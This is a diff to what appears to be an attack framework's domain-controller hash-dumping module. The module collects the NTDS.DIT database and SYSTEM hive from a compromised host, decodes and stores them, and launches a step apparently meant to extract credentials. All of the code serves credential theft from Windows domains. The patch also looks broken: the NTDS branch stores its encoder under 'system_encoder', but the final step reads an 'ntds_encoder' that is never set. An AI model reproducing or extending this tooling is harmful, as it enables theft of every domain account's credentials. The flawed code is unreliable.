@@ -54,7 +54,7 @@ class HashDumpDCImplant(core.implant.Implant):
 
 class HashDumpDCJob(core.job.Job):
 
-    def save_file(self, data, name, decode = True):
+    def save_file(self, data, name, encoder, decode = True):
         import uuid
         import os
         save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
@@ -68,7 +68,7 @@ class HashDumpDCJob(core.job.Job):
                 partfiles.append(save_fname+str(i))
                 pdata = data
                 if decode:
-                    pdata = self.decode_downloaded_data(pdata[i:i+step])
+                    pdata = self.decode_downloaded_data(pdata[i:i+step], encoder)
                 f.write(pdata)
             i += step
 
@@ -88,6 +88,7 @@ class HashDumpDCJob(core.job.Job):
 
             self.print_status("received SYSTEM hive (%d bytes)" % len(data))
             self.system_data = data
+            self.system_encoder = handler.get_header("encoder", False)
             return
 
         if task == self.options.get("NTDSFILE"):
@@ -95,6 +96,7 @@ class HashDumpDCJob(core.job.Job):
 
             self.print_status("received NTDS.DIT file (%d bytes)" % len(data))
             self.ntds_data = data
+            self.system_encoder = handler.get_header("encoder", False)
             return
 
         # dump ntds.dit here
@@ -105,10 +107,10 @@ class HashDumpDCJob(core.job.Job):
         handler.reply(200)
 
     def finish_up(self):
-        self.ntds_file = self.save_file(self.ntds_data, 'NTDS')
+        self.ntds_file = self.save_file(self.ntds_data, 'NTDS', self.ntds_encoder)
         self.print_status("decoded NTDS.DIT file (%s)" % self.ntds_file)
 
-        self.system_file = self.save_file(self.system_data, 'SYSTEM')
+        self.system_file = self.save_file(self.system_data, 'SYSTEM', self.system_encoder)
         self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
 
         from subprocess import Popen, PIPE, STDOUT
